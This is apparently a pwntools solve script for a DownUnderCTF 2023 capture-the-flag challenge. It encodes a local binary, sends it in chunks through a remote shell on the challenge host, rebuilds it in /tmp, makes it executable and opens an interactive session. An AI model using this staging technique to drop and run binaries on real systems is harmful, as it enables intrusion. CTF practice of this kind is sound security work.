#!/usr/bin/env ipython3

from pwn import *
import base64
import gzip

context.log_level = "debug"

with open('send', 'rb') as f:
    b = base64.b64encode(gzip.compress(f.read())).decode('ascii')

print(len(b))

r = remote('pwn-shifty-mem-d8c1ce3ede3b5c16.2023.ductf.dev', 443, ssl=True)
sleep(10)

r.sendline('cd /tmp')

groups = group(300, b)
for g in groups:
    r.sendline('echo %s >> solve.gz.b64' % g)

r.sendline('base64 -d ./solve.gz.b64 > solve.gz')
r.sendline('gunzip solve.gz')
r.sendline('chmod +x solve')

# context.log_level = "info"
r.interactive()